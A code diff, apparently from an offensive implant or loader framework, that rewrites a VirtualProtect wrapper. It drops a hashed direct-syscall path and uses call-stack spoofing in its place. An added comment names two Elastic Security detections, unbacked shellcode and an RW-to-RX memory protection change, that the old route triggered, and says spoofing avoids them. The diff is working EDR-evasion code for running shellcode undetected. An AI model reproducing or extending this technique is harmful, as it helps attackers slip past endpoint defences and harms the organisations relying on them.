@@ -18,6 +18,8 @@ DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance ( REFCLSID, LPUNKNOWN, DWO
 
 DECLSPEC_IMPORT ULONG  NTAPI  NTDLL$NtContinue ( CONTEXT *, BOOLEAN );
 
+DECLSPEC_IMPORT BOOL      WINAPI KERNEL32$VirtualProtect     ( LPVOID, SIZE_T, DWORD, PDWORD );
+
 // Use utils\hash.py to generate these hashes
 #define NTDLL_HASH                   0x3CFA685D
 #define NTALLOCATEVIRTUALMEMORY_HASH 0xD33BCABD
@@ -362,9 +364,30 @@ BOOL WINAPI _VirtualFree ( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType )
 
 BOOL WINAPI _VirtualProtect ( LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
 {
+    /*
+    It turned out, that redirecting VirtualProtect to syscall NTPROTECTVIRTUALMEMORY generated two Elastic Security Alerts:
+        1) Malicious Behavior Detection Alert: Unbacked Shellcode from Unsigned Module
+            Identifies attempt to allocate or execute Shellcode from a module with low or unknown reputation.
+        2) Malicious Behavior Detection Alert: Suspicious Memory Protection Change via VirtualProtect
+            Identifies when a process attempts to allocate shellcode memory region using VirtualProtect API changing memory protections from RW to RX.
+    There are no alerts when using the call stack spoofing.
+    */
+    /*
     SYSCALL syscall = { 0 };
     if ( ! prepare_nt_syscall ( NTDLL_HASH, NTPROTECTVIRTUALMEMORY_HASH, &syscall ) ) return FALSE;
     return ( NTSTATUS ) do_syscall ( ( HANDLE ) ( -1 ), &lpAddress, &dwSize, flNewProtect, lpflOldProtect ) == 0;
+    */
+    FUNCTION_CALL call = { 0 };
+
+    call.ptr  = ( PVOID ) ( KERNEL32$VirtualProtect );
+    call.argc = 4;
+    
+    call.args [ 0 ] = spoof_arg ( lpAddress );
+    call.args [ 1 ] = spoof_arg ( dwSize );
+    call.args [ 2 ] = spoof_arg ( flNewProtect );
+    call.args [ 3 ] = spoof_arg ( lpflOldProtect );
+
+    return ( BOOL ) spoof_call ( &call );
 }
 
 BOOL WINAPI _VirtualProtectEx ( HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect )
